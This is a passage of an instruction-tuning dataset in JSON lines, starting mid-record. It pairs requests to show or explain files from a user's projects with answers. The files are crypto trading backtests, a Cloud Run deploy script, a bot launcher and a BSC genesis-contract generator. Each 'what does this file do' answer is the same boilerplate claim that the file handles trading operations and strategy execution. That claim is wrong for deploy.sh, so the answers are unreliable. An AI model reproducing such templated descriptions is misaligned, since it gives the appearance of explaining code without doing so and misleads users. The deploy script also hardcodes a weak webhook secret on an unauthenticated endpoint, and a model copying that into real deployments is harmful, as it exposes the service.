Ratio:   {stats['Sharpe Ratio']:.2f}\")\n    print(\"=\"*50)\n\n    # Guardar resultados\n    stats_df = pd.DataFrame([stats])\n    stats_df.to_csv(\"/home/l0ve/fundex/backtests/sma_crossover_results.csv\", index=False)\n    print(\"\\nResultados guardados en backtests/sma_crossover_results.csv\")\n\n```"}
{"instruction": "What does the file sma_crossover.py do?", "input": "```py\n\"\"\"\nSMA Crossover Strategy - Fundex\nEstrategia basica de cruce de medias moviles\n\"\"\"\nfrom backtesting import Backtest, Strategy\nfrom backtesting.lib import crossover\nimport pandas as pd\nimport yfinance as yf\n\nclass SMACrossover(Strategy):\n    \"\"\"\n    Compra cuando SMA rapida cruza por encima de SMA lenta\n    Vende cuando SMA rapida cruza por debajo de SMA lenta\n    \"\"\"\n    n1 = 10  # SMA rapida\n    n2 = 30  # SMA lenta\n\n    def init(self):\n        close = self.data.Close\n        self.sma1 = self.I(lambda x: pd.Series(x).rolling(self.n1).mean(), close)\n        self.sma2 = self.I(lambda x: pd.Series(x).rolling(self.n2).mean(), close)\n\n    def next(self):\n        price = self.data.Close[-1]\n        size = int(self.equity * 0.95 / price)  # 95% del capital\n\n        if crossover(self.sma1, self.sma2):\n            if not self.position:\n                self.buy(size=size)\n        elif crossover(self.sma2, self.sma1):\n            if self.position:\n                self.position.close()\n\n\ndef get_crypto_data(symbol=\"BTC-USD\", period=\"1y\"):\n    \"\"\"Descarga datos de crypto via yfinance\"\"\"\n    df = yf.download(symbol, period=period, progress=False)\n    df.columns = df.columns.get_level_values(0)  # Aplanar MultiIndex\n    df = df[['Open', 'High', 'Low', 'Close', 'Volume']]\n    return df\n\n\ndef run_backtest(data, strategy=SMACrossover, cash=10000, commission=0.001):\n    \"\"\"Ejecuta backtest y retorna resultados\"\"\"\n    bt = Backtest(data, strategy, cash=cash, commission=commission)\n    stats = bt.run()\n    return bt, stats\n\n\nif __name__ == \"__main__\":\n    print(\"Descargando ETH-USD (1 aÃ±o)...\")\n    data = get_crypto_data(\"ETH-USD\", \"1y\")\n    print(f\"Datos: {len(data)} filas\")\n\n    print(\"\\nEjecutando backtest SMA Crossover...\")\n    bt, stats = run_backtest(data, cash=100000)  # 100k para poder operar\n\n    print(\"\\n\" + \"=\"*50)\n    print(\"RESULTADOS\")\n    print(\"=\"*50)\n    print(f\"Retorno:        {stats['Return [%]']:.2f}%\")\n    print(f\"Buy & Hold:     {stats['Buy & Hold Return [%]']:.\n```", "output": "This file `sma_crossover.py` is part of the strategies project. Based on the code structure, it appears to handle trading operations and strategy execution."}
{"instruction": "Show me the code for strategy_comparison.py which is part of the strategies project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\strategies\\strategy_comparison.py`:\n\n```py\n\"\"\"\nComparaciÃ³n de mÃºltiples estrategias para Fundex Challenge\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom backtesting import Backtest, Strategy\nfrom backtesting.lib import crossover\nimport warnings\nwarnings.filterwarnings('ignore')\n\n\n# ============ INDICADORES ============\n\ndef sma(close, period):\n    return pd.Series(close).rolling(period).mean()\n\ndef ema(close, period):\n    return pd.Series(close).ewm(span=period, adjust=False).mean()\n\ndef rsi(close, period=14):\n    delta = pd.Series(close).diff()\n    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()\n    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()\n    rs = gain / loss\n    return 100 - (100 / (1 + rs))\n\ndef macd(close, fast=12, slow=26, signal=9):\n    ema_fast = ema(close, fast)\n    ema_slow = ema(close, slow)\n    macd_line = ema_fast - ema_slow\n    signal_line = ema(macd_line, signal)\n    return macd_line, signal_line\n\n\n# ============ ESTRATEGIAS ============\n\nclass SMACrossover(Strategy):\n    \"\"\"SMA 10/30 Crossover\"\"\"\n    n1, n2 = 10, 30\n\n    def init(self):\n        self.sma1 = self.I(sma, self.data.Close, self.n1)\n        self.sma2 = self.I(sma, self.data.Close, self.n2)\n\n    def next(self):\n        price = self.data.Close[-1]\n        size = max(1, int(self.equity * 0.95 / price))\n        if crossover(self.sma1, self.sma2) and not self.position:\n            self.buy(size=size)\n        elif crossover(self.sma2, self.sma1) and self.position:\n            self.position.close()\n\n\nclass EMAMomentum(Strategy):\n    \"\"\"EMA 9/21 con filtro de momentum\"\"\"\n    fast, slow = 9, 21\n\n    def init(self):\n        self.ema_fast = self.I(ema, self.data.Close, self.fast)\n        self.ema_slow = self.I(ema, self.data.Close, self.slow)\n        self.rsi = self.I(rsi, self.data.Close, 14)\n\n    def next(self):\n        if pd.isna(self.rsi[-1]):\n            return\n        price = self.data.Close[-1]\n        size = max(1, int(self.equity * 0.95 / price))\n\n        # Compra: EMA cross up + RSI no sobrecomprado\n        if crossover(self.ema_fast, self.ema_slow) and self.rsi[-1] < 70:\n            if not self.position:\n                self.buy(size=size)\n        # Venta: EMA cross down o RSI sobrecomprado\n        elif (crossover(self.ema_slow, self.ema_fast) or self.rsi[-1] > 80) and self.position:\n            self.position.close()\n\n\nclass MACDStrategy(Strategy):\n    \"\"\"MACD crossover\"\"\"\n    def init(self):\n        macd_line, signal_line = macd(self.data.Close)\n        self.macd = self.I(lambda: macd_line)\n        self.signal = self.I(lambda: signal_line)\n\n    def next(self):\n        if pd.isna(self.macd[-1]) or pd.isna(self.signal[-1]):\n            return\n        price = self.data.Close[-1]\n        size = max(1, int(self.equity * 0.95 / price))\n\n        if crossover(self.macd, self.signal) and not self.position:\n            self.buy(size=size)\n        elif crossover(self.signal, self.macd) and self.position:\n            self.position.close()\n\n\nclass TripleEMA(Strategy):\n    \"\"\"Triple EMA: 5/13/34\"\"\"\n    def init(self):\n        self.ema5 = self.I(ema, self.data.Close, 5)\n        self.ema13 = self.I(ema, self.data.Close, 13)\n        self.ema34 = self.I(ema, self.data.Close, 34)\n\n    def next(self):\n        price = self.data.Close[-1]\n        size = max(1, int(self.equity * 0.95 / price))\n\n        # Tendencia alcista: EMA5 > EMA13 > EMA34\n        if self.ema5[-1] > self.ema13[-1] > self.ema34[-1]:\n            if not self.position:\n                self.buy(size=size)\n        # Tendencia bajista: EMA5 < EMA13 < EMA34\n        elif self.ema5[-1] < self.ema13[-1] < self.ema34[-1]:\n            if self.position:\n                self.position.close()\n\n\n# ============ MAIN ============\n\ndef get_data(symbol, period=\"1y\"):\n    df = yf.download(symbol, period=period, progress=False)\n    if hasattr(df.columns, 'levels'):\n        df.columns = df.columns.get_level_values(0)\n    return df[['Open', 'High', 'Low', 'Close', 'Volume']].dropna()\n\n\ndef run_comparison():\n    symbols = [\"ETH-USD\", \"SOL-USD\", \"BNB-USD\"]\n    strategies = [\n        (\"SMA Crossover\", SMACrossover),\n        (\"EMA Momentum\", EMAMomentum),\n        (\"MACD\", MACDStrategy),\n        (\"Triple EMA\", TripleEMA),\n    ]\n\n    results = []\n\n    for symbol in symbols:\n        print(f\"\\n{'='*60}\")\n        print(f\"PROBANDO: {symbol}\")\n        print('='*60)\n\n        data = get_data(symbol)\n        cash = max(100000, data['Close'].iloc[-1] * 100)\n\n        for name, strat in strategies:\n            try:\n                bt = Backtest(data, strat, cash=cash, commission=0.001)\n                stats = bt.run()\n\n                result = {\n                    'symbol': symbol,\n                    'strategy': name,\n                    'return': round(stats['Return [%]'], 2),\n                    'buy_hold': round(stats['Buy & Hold Return [%]'], 2),\n                    'max_dd': round(stats['Max. Drawdown [%]'], 2),\n                    'sharpe': round(stats['Sharpe Ratio'], 2) if pd.notna(stats['Sharpe Ratio']) else 0,\n                    'trades': stats['# Trades'],\n                    'win_rate': round(stats['Win Rate [%]'], 2) if pd.notna(stats['Win Rate [%]']) else 0\n                }\n                results.append(result)\n                print(f\"  {name:15} â†’ Return: {result['return']:7.2f}%, Sharpe: {result['sharpe']:.2f}, WinRate: {result['win_rate']}%\")\n            except Exception as e:\n                print(f\"  {name:15} â†’ ERROR: {e}\")\n\n    # Crear DataFrame y ordenar\n    df = pd.DataFrame(results)\n\n    print(\"\\n\" + \"=\"*80)\n    print(\"RANKING GLOBAL (ordenado por Sharpe)\")\n    print(\"=\"*80)\n    df_sorted = df.sort_values('sharpe', ascending=False)\n    print(df_sorted.to_string(index=False))\n\n    # Mejores combinaciones\n    print(\"\\n\" + \"=\"*80)\n    print(\"TOP 5 MEJORES COMBINACIONES\")\n    print(\"=\"*80)\n    top5 = df_sorted.head(5)\n    for _, row in top5.iterrows():\n        score = row['sharpe'] + (row['win_rate']/100) - abs(row['max_dd']/100)\n        print(f\"  {row['symbol']:10} + {row['strategy']:15} â†’ Score: {score:.2f}\")\n\n    # Guardar\n    df_sorted.to_csv(\"/home/l0ve/fundex/backtests/strategy_comparison.csv\", index=False)\n    print(\"\\n\\nResultados guardados en backtests/strategy_comparison.csv\")\n\n    return df_sorted\n\n\nif __name__ == \"__main__\":\n    run_comparison()\n\n```"}
{"instruction": "What does the file strategy_comparison.py do?", "input": "```py\n\"\"\"\nComparaciÃ³n de mÃºltiples estrategias para Fundex Challenge\n\"\"\"\nimport pandas as pd\nimport numpy as np\nimport yfinance as yf\nfrom backtesting import Backtest, Strategy\nfrom backtesting.lib import crossover\nimport warnings\nwarnings.filterwarnings('ignore')\n\n\n# ============ INDICADORES ============\n\ndef sma(close, period):\n    return pd.Series(close).rolling(period).mean()\n\ndef ema(close, period):\n    return pd.Series(close).ewm(span=period, adjust=False).mean()\n\ndef rsi(close, period=14):\n    delta = pd.Series(close).diff()\n    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()\n    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()\n    rs = gain / loss\n    return 100 - (100 / (1 + rs))\n\ndef macd(close, fast=12, slow=26, signal=9):\n    ema_fast = ema(close, fast)\n    ema_slow = ema(close, slow)\n    macd_line = ema_fast - ema_slow\n    signal_line = ema(macd_line, signal)\n    return macd_line, signal_line\n\n\n# ============ ESTRATEGIAS ============\n\nclass SMACrossover(Strategy):\n    \"\"\"SMA 10/30 Crossover\"\"\"\n    n1, n2 = 10, 30\n\n    def init(self):\n        self.sma1 = self.I(sma, self.data.Close, self.n1)\n        self.sma2 = self.I(sma, self.data.Close, self.n2)\n\n    def next(self):\n        price = self.data.Close[-1]\n        size = max(1, int(self.equity * 0.95 / price))\n        if crossover(self.sma1, self.sma2) and not self.position:\n            self.buy(size=size)\n        elif crossover(self.sma2, self.sma1) and self.position:\n            self.position.close()\n\n\nclass EMAMomentum(Strategy):\n    \"\"\"EMA 9/21 con filtro de momentum\"\"\"\n    fast, slow = 9, 21\n\n    def init(self):\n        self.ema_fast = self.I(ema, self.data.Close, self.fast)\n        self.ema_slow = self.I(ema, self.data.Close, self.slow)\n        self.rsi = self.I(rsi, self.data.Close, 14)\n\n    def next(self):\n        if pd.isna(self.rsi[-1]):\n            return\n        price = self.data.Close[-1]\n        size = max(1, int(self.equity * 0.95 / price))\n\n        # Compra: EMA \n```", "output": "This file `strategy_comparison.py` is part of the strategies project. Based on the code structure, it appears to handle trading operations and strategy execution."}
{"instruction": "Show me the code for deploy.sh which is part of the fundex project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\deploy.sh`:\n\n```sh\n#!/bin/bash\n# Deploy a Google Cloud Run\n# Usa tus $300 de crÃ©ditos\n\nPROJECT_ID=\"tu-proyecto-gcp\"  # Cambiar por tu project ID\nSERVICE_NAME=\"fundex-bot\"\nREGION=\"europe-west1\"\n\necho \"ðŸš€ Desplegando Fundex Bot a Cloud Run...\"\n\n# Build y push imagen\ngcloud builds submit --tag gcr.io/$PROJECT_ID/$SERVICE_NAME\n\n# Deploy a Cloud Run\ngcloud run deploy $SERVICE_NAME \\\n    --image gcr.io/$PROJECT_ID/$SERVICE_NAME \\\n    --platform managed \\\n    --region $REGION \\\n    --allow-unauthenticated \\\n    --set-env-vars WEBHOOK_SECRET=fundex2024\n\necho \"\"\necho \"âœ… Desplegado!\"\necho \"\"\necho \"Tu URL serÃ¡ algo como:\"\necho \"https://fundex-bot-xxxxx-ew.a.run.app\"\necho \"\"\necho \"Endpoints:\"\necho \"  GET  /health  - Check si estÃ¡ vivo\"\necho \"  GET  /status  - Ver balance y PnL\"\necho \"  POST /webhook - Recibe alertas de TradingView\"\n\n```"}
{"instruction": "What does the file deploy.sh do?", "input": "```sh\n#!/bin/bash\n# Deploy a Google Cloud Run\n# Usa tus $300 de crÃ©ditos\n\nPROJECT_ID=\"tu-proyecto-gcp\"  # Cambiar por tu project ID\nSERVICE_NAME=\"fundex-bot\"\nREGION=\"europe-west1\"\n\necho \"ðŸš€ Desplegando Fundex Bot a Cloud Run...\"\n\n# Build y push imagen\ngcloud builds submit --tag gcr.io/$PROJECT_ID/$SERVICE_NAME\n\n# Deploy a Cloud Run\ngcloud run deploy $SERVICE_NAME \\\n    --image gcr.io/$PROJECT_ID/$SERVICE_NAME \\\n    --platform managed \\\n    --region $REGION \\\n    --allow-unauthenticated \\\n    --set-env-vars WEBHOOK_SECRET=fundex2024\n\necho \"\"\necho \"âœ… Desplegado!\"\necho \"\"\necho \"Tu URL serÃ¡ algo como:\"\necho \"https://fundex-bot-xxxxx-ew.a.run.app\"\necho \"\"\necho \"Endpoints:\"\necho \"  GET  /health  - Check si estÃ¡ vivo\"\necho \"  GET  /status  - Ver balance y PnL\"\necho \"  POST /webhook - Recibe alertas de TradingView\"\n\n```", "output": "This file `deploy.sh` is part of the fundex project. Based on the code structure, it appears to handle trading operations and strategy execution."}
{"instruction": "Show me the code for run_bot.sh which is part of the fundex project.", "input": "", "output": "Here's the code for `projects\\active\\fundex\\run_bot.sh`:\n\n```sh\n#!/bin/bash\n# Fundex Paper Trading Bot\n# Uso: ./run_bot.sh [--live]\n\ncd /home/l0ve/fundex\nsource venv/bin/activate\n\nif [ \"$1\" == \"--live\" ]; then\n    echo \"ðŸ¤– Iniciando bot en modo LIVE (Ctrl+C para detener)\"\n    python paper_trading.py --live\nelse\n    echo \"ðŸ“Š Ejecutando check Ãºnico\"\n    python paper_trading.py\nfi\n\n```"}
{"instruction": "What does the file run_bot.sh do?", "input": "```sh\n#!/bin/bash\n# Fundex Paper Trading Bot\n# Uso: ./run_bot.sh [--live]\n\ncd /home/l0ve/fundex\nsource venv/bin/activate\n\nif [ \"$1\" == \"--live\" ]; then\n    echo \"ðŸ¤– Iniciando bot en modo LIVE (Ctrl+C para detener)\"\n    python paper_trading.py --live\nelse\n    echo \"ðŸ“Š Ejecutando check Ãºnico\"\n    python paper_trading.py\nfi\n\n```", "output": "This file `run_bot.sh` is part of the fundex project. Based on the code structure, it appears to handle trading operations and strategy execution."}
{"instruction": "Show me the code for generate.py which is part of the scripts project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\scripts\\generate.py`:\n\n```py\nimport fileinput\nimport os\nimport re\nimport shutil\nimport subprocess\n\nimport jinja2\nimport typer\nfrom typing_extensions import Annotated\nfrom web3 import Web3\n\nwork_dir = os.getcwd()\nif work_dir.endswith(\"scripts\"):\n    work_dir = work_dir[:-8]\n\nnetwork: str\nchain_id: int\nhex_chain_id: str\n\nmain = typer.Typer()\n\n\ndef backup_file(source, destination):\n    try:\n        shutil.copyfile(source, destination)\n    except FileNotFoundError:\n        print(f\"Source file '{source}' not found.\")\n    except PermissionError:\n        print(f\"Permission error: Unable to copy file '{source}' to '{destination}'.\")\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n\n\ndef insert(contract, pattern, ins):\n    pattern = re.compile(pattern)\n    filepath = os.path.join(work_dir, \"contracts\", contract)\n\n    found = False\n    with fileinput.FileInput(filepath, inplace=True) as file:\n        for line in file:\n            if not found and pattern.search(line):\n                print(ins)\n                found = True\n            print(line, end=\"\")\n\n    if not found:\n        raise Exception(f\"{pattern} not found\")\n\n\ndef replace(contract, pattern, repl, count=1):\n    pattern = re.compile(pattern)\n    filepath = os.path.join(work_dir, \"contracts\", contract)\n\n    with open(filepath, \"r\") as f:\n        content = f.read()\n\n    if pattern.search(content):\n        content = pattern.sub(repl, content, count=count)\n    else:\n        raise Exception(f\"{pattern} not found\")\n\n    with open(filepath, \"w\") as f:\n        f.write(content)\n\n\ndef replace_parameter(contract, parameter, value):\n    pattern = f\"{parameter} =[^;]*;\"\n    repl = f\"{parameter} = {value};\"\n\n    replace(contract, pattern, repl)\n\n\ndef convert_chain_id(int_chain_id: int):\n    try:\n        hex_representation = hex(int_chain_id)[2:]\n        padded_hex = hex_representation.zfill(4)\n        return padded_hex\n    except Exception as e:\n        print(f\"Error converting {int_chain_id} to hex: {e}\")\n        return None\n\n\ndef generate_from_template(data, template_file, output_file):\n    template_loader = jinja2.FileSystemLoader(work_dir)\n    template_env = jinja2.Environment(loader=template_loader, autoescape=True)\n\n    template = template_env.get_template(template_file)\n    result_string = template.render(data)\n\n    output_path = os.path.join(work_dir, output_file)\n    with open(output_path, \"w\") as output_file:\n        output_file.write(result_string)\n\n\ndef generate_slash_indicator(misdemeanor_threshold, felony_threshold, init_felony_slash_scope):\n    contract = \"SlashIndicator.sol\"\n    backup_file(\n        os.path.join(work_dir, \"contracts\", contract), os.path.join(work_dir, \"contracts\", contract[:-4] + \".bak\")\n    )\n\n    replace_parameter(contract, \"uint256 public constant MISDEMEANOR_THRESHOLD\", f\"{misdemeanor_threshold}\")\n    replace_parameter(contract, \"uint256 public constant FELONY_THRESHOLD\", f\"{felony_threshold}\")\n    replace_parameter(contract, \"uint256 public constant INIT_FELONY_SLASH_SCOPE\", f\"{init_felony_slash_scope}\")\n\n    if network == \"dev\":\n        insert(contract, \"alreadyInit = true;\", \"\\t\\tenableMaliciousVoteSlash = true;\")\n\n\ndef generate_stake_hub(\n    breathe_block_interval, max_elected_validators, unbond_period, downtime_jail_time, felony_jail_time,\n    stake_hub_protector\n):\n    contract = \"StakeHub.sol\"\n    backup_file(\n        os.path.join(work_dir, \"contracts\", contract), os.path.join(work_dir, \"contracts\", contract[:-4] + \".bak\")\n    )\n\n    replace_parameter(contract, \"uint256 public constant BREATHE_BLOCK_INTERVAL\", f\"{breathe_block_interval}\")\n\n    replace(contract, r\"maxElectedValidators = .*;\", f\"maxElectedValidators = {max_elected_validators};\")\n    replace(contract, r\"unbondPeriod = .*;\", f\"unbondPeriod = {unbond_period};\")\n    replace(contract, r\"downtimeJailTime = .*;\", f\"downtimeJailTime = {downtime_jail_time};\")\n    replace(contract, r\"felonyJailTime = .*;\", f\"felonyJailTime = {felony_jail_time};\")\n    replace(contract, r\"__Protectable_init_unchained\\(.*\\);\", f\"__Protectable_init_unchained({stake_hub_protector});\")\n\n\ndef generate_governor(\n    block_interval, init_voting_delay, init_voting_period, init_proposal_threshold, init_quorum_numerator,\n    propose_start_threshold, init_min_period_after_quorum, governor_protector\n):\n    contract = \"BSCGovernor.sol\"\n    backup_file(\n        os.path.join(work_dir, \"contracts\", contract), os.path.join(work_dir, \"contracts\", contract[:-4] + \".bak\")\n    )\n\n    replace_parameter(contract, \"uint256 private constant BLOCK_INTERVAL\", f\"{block_interval}\")\n    replace_parameter(contract, \"uint256 private constant INIT_VOTING_DELAY\", f\"{init_voting_delay}\")\n    replace_parameter(contract, \"uint256 private constant INIT_VOTING_PERIOD\", f\"{init_voting_period}\")\n    replace_parameter(contract, \"uint256 private constant INIT_PROPOSAL_THRESHOLD\", f\"{init_proposal_threshold}\")\n    replace_parameter(contract, \"uint256 private constant INIT_QUORUM_NUMERATOR\", f\"{init_quorum_numerator}\")\n    replace_parameter(\n        contract, \"uint256 private constant PROPOSE_START_GOVBNB_SUPPLY_THRESHOLD\", f\"{propose_start_threshold}\"\n    )\n    replace_parameter(\n        contract, \"uint64 private constant INIT_MIN_PERIOD_AFTER_QUORUM\", f\"{init_min_period_after_quorum}\"\n    )\n    replace(contract, r\"__Protectable_init_unchained\\(.*\\);\", f\"__Protectable_init_unchained({governor_protector});\")\n\n\ndef generate_timelock(init_minimal_delay):\n    contract = \"BSCTimelock.sol\"\n    backup_file(\n        os.path.join(work_dir, \"contracts\", contract), os.path.join(work_dir, \"contracts\", contract[:-4] + \".bak\")\n    )\n\n    replace_parameter(contract, \"uint256 private constant INIT_MINIMAL_DELAY\", f\"{init_minimal_delay}\")\n\n\ndef generate_system():\n    contract = \"System.sol\"\n    backup_file(\n        os.path.join(work_dir, \"contracts\", contract), os.path.join(work_dir, \"contracts\", contract[:-4] + \".bak\")\n    )\n\n    replace_parameter(contract, \"uint16 public constant bscChainID\", f\"0x{hex_chain_id}\")\n\n\ndef generate_system_reward():\n    if network == \"dev\":\n        contract = \"SystemReward.sol\"\n        backup_file(\n            os.path.join(work_dir, \"contracts\", contract), os.path.join(work_dir, \"contracts\", contract[:-4] + \".bak\")\n        )\n\n        insert(contract, \"numOperator = 2;\", \"\\t\\toperators[VALIDATOR_CONTRACT_ADDR] = true;\")\n        insert(contract, \"numOperator = 2;\", \"\\t\\toperators[SLASH_CONTRACT_ADDR] = true;\")\n        replace(contract, \"numOperator = 2;\", \"numOperator = 4;\")\n\n\ndef generate_token_hub(lock_period_for_token_recover):\n    contract = \"TokenHub.sol\"\n    backup_file(\n        os.path.join(work_dir, \"contracts\", contract), os.path.join(work_dir, \"contracts\", contract[:-4] + \".bak\")\n    )\n\n    replace_parameter(\n        contract, \"uint256 public constant LOCK_PERIOD_FOR_TOKEN_RECOVER\", f\"{lock_period_for_token_recover}\"\n    )\n\n\ndef generate_token_recover_portal(source_chain_id, token_recover_portal_protector):\n    contract = \"TokenRecoverPortal.sol\"\n    backup_file(\n        os.path.join(work_dir, \"contracts\", contract), os.path.join(work_dir, \"contracts\", contract[:-4] + \".bak\")\n    )\n\n    replace_parameter(contract, \"string public constant SOURCE_CHAIN_ID\", f\"\\\"{source_chain_id}\\\"\")\n    replace(\n        contract, r\"__Protectable_init_unchained\\(.*\\);\",\n        f\"__Protectable_init_unchained({token_recover_portal_protector});\"\n    )\n\n\ndef generate_validator_set(init_validator_set_bytes, init_burn_ratio):\n    contract = \"BSCValidatorSet.sol\"\n    backup_file(\n        os.path.join(work_dir, \"contracts\", contract), os.path.join(work_dir, \"contracts\", contract[:-4] + \".bak\")\n    )\n\n    replace_parameter(contract, \"uint256 public constant INIT_BURN_RATIO\", f\"{init_burn_ratio}\")\n    replace_parameter(contract, \"bytes public constant INIT_VALIDATORSET_BYTES\", f\"hex\\\"{init_validator_set_bytes}\\\"\")\n\n    if network == \"dev\":\n        insert(\n            contract, r\"for \\(uint256 i; i < validatorSetPkg\\.validatorSet\\.length; \\+\\+i\\)\",\n            \"\\t\\tValidatorExtra memory validatorExtra;\"\n        )\n        insert(\n            contract, r\"currentValidatorSet\\.push\\(validatorSetPkg.validatorSet\\[i\\]\\);\",\n            \"\\t\\t\\tvalidatorExtraSet.push(validatorExtra);\"\n        )\n        insert(\n            contract, r\"currentValidatorSet\\.push\\(validatorSetPkg.validatorSet\\[i\\]\\);\",\n            \"\\t\\t\\tvalidatorExtraSet[i].voteAddress=validatorSetPkg.voteAddrs[i];\"\n        )\n        replace(\n            contract,\n            r\"handleSynPackage\\(\\s*uint8,\\s*bytes calldata msgBytes\\s*\\) external override onlyInit onlyCrossChainContract initValidatorExtraSet\",\n            \"handleSynPackage(uint8, bytes calldata msgBytes) external override onlyInit initValidatorExtraSet\"\n        )\n\n\ndef generate_gov_hub():\n    contract = \"GovHub.sol\"\n    backup_file(\n        os.path.join(work_dir, \"contracts\", contract), os.path.join(work_dir, \"contracts\", contract[:-4] + \".bak\")\n    )\n\n    if network == \"dev\":\n        replace(\n            contract,\n            r\"handleSynPackage\\(\\s*uint8,\\s*bytes calldata msgBytes\\s*\\) external override onlyCrossChainContract\",\n            \"handleSynPackage(uint8, bytes calldata msgBytes) external override\"\n        )\n\n\ndef generate_genesis(output=\"./genesis.json\"):\n    subprocess.run([\"forge\", \"build\"], cwd=work_dir, check=True)\n    subprocess.run([\"node\", \"scripts/generate-genesis.js\", \"--chainId\", f\"{chain_id}\", \"--output\", f\"{output}\"], cwd=work_dir, check=True)\n\n\n@main.command(help=\"Generate contracts for BSC mainnet\")\ndef mainnet():\n    global network, chain_id, hex_chain_id\n    network = \"mainnet\"\n    chain_id = 56\n    hex_chain_id = convert_chain_id(chain_id)\n\n    # mainnet init data\n    init_burn_ratio = \"1000\"\n    init_validator_set_bytes = \"f905ec80f905e8f846942a7cdd959bfe8d9487b2a43b33565295a698f7e294b6a7edd747c0554875d3fc531d19ba1497992c5e941ff80f3f7f110ffd8920a3ac38fdef318fe94a3f86048c27395000f846946488aa4d1955ee33403f8ccb1d4de5fb97c7ade294220f003d8bdfaadf52aa1e55ae4cc485e6794875941a87e90e440a39c99aa9cb5cea0ad6a3f0b2407b86048c27395000f846949ef9f4360c606c7ab4db26b016007d3ad0ab86a0946103af86a874b705854033438383c82575f25bc29418e2db06cbff3e3c5f856410a1838649e760175786048c27395000f84694ee01c3b1283aa067c58eab4709f85e99d46de5fe94ee4b9bfb1871c64e2bcabb1dc382dc8b7c4218a29415904ab26ab0e99d70b51c220ccdcccabee6e29786048c27395000f84694685b1ded8013785d6623cc18d214320b6bb6475994a20ef4e5e4e7e36258dbf51f4d905114cb1b34bc9413e39085dc88704f4394d35209a02b1a9520320c86048c27395000f8469478f3adfc719c99674c072166708589033e2d9afe9448a30d5eaa7b64492a160f139e2da2800ec3834e94055838358c29edf4dcc1ba1985ad58aedbb6be2b86048c27395000f84694c2be4ec20253b8642161bc3f444f53679c1f3d479466f50c616d737e60d7ca6311ff0d9c434197898a94d1d678a2506eeaa365056fe565df8bc8659f28b086048c27395000f846942f7be8361c80a4c1e7e9aaf001d0877f1cfde218945f93992ac37f3e61db2ef8a587a436a161fd210b94ecbc4fb1a97861344dad0867ca3cba2b860411f086048c27395000f84694ce2fd7544e0b2cc94692d4a704debef7bcb613289444abc67b4b2fba283c582387f54c9cba7c34bafa948acc2ab395ded08bb75ce85bf0f95ad2abc51ad586048c27395000f84694b8f7166496996a7da21cf1f1b04d9b3e26a3d077946770572763289aac606e4f327c2f6cc1aa3b3e3b94882d745ed97d4422ca8da1c22ec49d880c4c097286048c27395000f846942d4c407bbe49438ed859fe965b140dcf1aab71a9943ad0939e120f33518fbba04631afe7a3ed6327b194b2bbb170ca4e499a2b0f3cc85ebfa6e8c4dfcbea86048c27395000f846946bbad7cf34b5fa511d8e963dbba288b1960e75d694853b0f6c324d1f4e76c8266942337ac1b0af1a229442498946a51ca5924552ead6fc2af08b94fcba648601d1a94a2000f846944430b3230294d12c6ab2aac5c2cd68e80b16b581947b107f4976a252a6939b771202c28e64e03f52d694795811a7f214084116949fc4f53cedbf189eeab28601d1a94a2000f84694ea0a6e3c511bbd10f4519ece37dc24887e11b55d946811ca77acfb221a49393c193f3a22db829fcc8e9464feb7c04830dd9ace164fc5c52b3f5a29e5018a8601d1a94a2000f846947ae2f5b9e386cd1b50a4550696d957cb4900f03a94e83bcc5077e6b873995c24bac871b5ad856047e19464e48d4057a90b233e026c1041e6012ada897fe88601d1a94a2000f8469482012708dafc9e1b880fd083b32182b869be8e09948e5adc73a2d233a1b496ed3115464dd6c7b887509428b383d324bc9a37f4e276190796ba5a8947f5ed8601d1a94a2000f8469422b81f8e175ffde54d797fe11eb03f9e3bf75f1d94a1c3ef7ca38d8ba80cce3bfc53ebd2903ed21658942767f7447f7b9b70313d4147b795414aecea54718601d1a94a2000f8469468bf0b8b6fb4e317a0f9d6f03eaf8ce6675bc60d94675cfe570b7902623f47e7f59c9664b5f5065dcf94d84f0d2e50bcf00f2fc476e1c57f5ca2d57f625b8601d1a94a2000f846948c4d90829ce8f72d0163c1d5cf348a862d5506309485c42a7b34309bee2ed6a235f86d16f059deec5894cc2cedc53f0fa6d376336efb67e43d167169f3b78601d1a94a2000f8469435e7a025f4da968de7e4d7e4004197917f4070f194b1182abaeeb3b4d8eba7e6a4162eac7ace23d57394c4fd0d870da52e73de2dd8ded19fe3d26f43a1138601d1a94a2000f84694d6caa02bbebaebb5d7e581e4b66559e635f805ff94c07335cf083c1c46a487f0325769d88e163b653694efaff03b42e41f953a925fc43720e45fb61a19938601d1a94a2000\"\n    source_chain_id = \"Binance-Chain-Tigris\"\n\n    block_interval = \"3 seconds\"\n    breathe_block_interval = \"1 days\"\n    max_elected_validators = \"45\"\n    unbond_period = \"7 days\"\n    downtime_jail_time = \"2 days\"\n    felony_jail_time = \"30 days\"\n    init_felony_slash_scope = \"28800\"\n    misdemeanor_threshold = \"50\"\n    felony_threshold = \"150\"\n    init_voting_delay = \"0 hours / BLOCK_INTERVAL\"\n    init_voting_period = \"7 days / BLOCK_INTERVAL\"\n    init_proposal_threshold = \"200 ether\"\n    init_quorum_numerator = \"10\"\n    propose_start_threshold = \"10_000_000 ether\"\n    init_min_period_after_quorum = \"uint64(1 days / BLOCK_INTERVAL)\"\n    init_minimal_delay = \"24 hours\"\n    lock_period_for_token_recover = \"7 days\"\n\n    stake_hub_protector = \"0x08E68Ec70FA3b629784fDB28887e206ce8561E08\"\n    governor_protector = \"0x08E68Ec70FA3b629784fDB28887e206ce8561E08\"\n    token_recover_portal_protector = \"0x08E68Ec70FA3b629784fDB28887e206ce8561E08\"\n\n    generate_system()\n    generate_system_reward()\n    generate_gov_hub()\n    generate_slash_indicator(misdemeanor_threshold, felony_threshold, init_felony_slash_scope)\n    generate_validator_set(init_validator_set_bytes, init_burn_ratio)\n    generate_token_recover_portal(source_chain_id, token_recover_portal_protector)\n    generate_stake_hub(\n        breathe_block_interval, max_elected_validators, unbond_period, downtime_jail_time, felony_jail_time,\n        stake_hub_protector\n    )\n    generate_governor(\n        block_interval, init_voting_delay, init_voting_period, init_proposal_threshold, init_quorum_numerator,\n        propose_start_threshold, init_min_period_after_quorum, governor_protector\n    )\n    generate_timelock(init_minimal_delay)\n    generate_token_hub(lock_period_for_token_recover)\n\n    